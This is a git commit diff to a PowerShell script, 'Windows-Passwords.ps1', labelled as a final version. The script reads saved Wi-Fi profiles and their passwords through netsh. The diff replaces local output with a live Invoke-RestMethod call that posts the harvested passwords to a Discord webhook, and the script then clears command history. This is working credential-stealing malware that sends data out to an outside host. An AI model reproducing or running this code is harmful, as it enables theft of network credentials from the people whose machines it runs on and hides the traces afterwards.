99136aa55564005692cc5a0bc562c76238018ac7
Javi Rufo <150443755+javirufo-ies@users.noreply.github.com>
2025-12-10 09:03:36 +0100

    Versión final 1.0

--- Windows-Passwords.ps1
+++ Windows-Passwords.ps1
@@ -8,13 +8,7 @@ netsh wlan show profile | Select-String '(?<=Perfil de todos los usuarios\s+:\s)
 		'content' = [string]$passw
 	}
 	
-	# Invoke-RestMethod -ContentType 'Application/Json' -Uri $discord -Method Post -Body ($Body | ConvertTo-Json)
-
-	# Invoke-RestMethod -ContentType 'Application/Json' -Uri $discord -Method Post -Body ($Body | ConvertTo-Json) > salida.txt
-	
-	Write-Output $Body 
-	
-
+	Invoke-RestMethod -ContentType 'Application/Json' -Uri $discord -Method Post -Body ($Body | ConvertTo-Json)
 }
 
 Clear-History
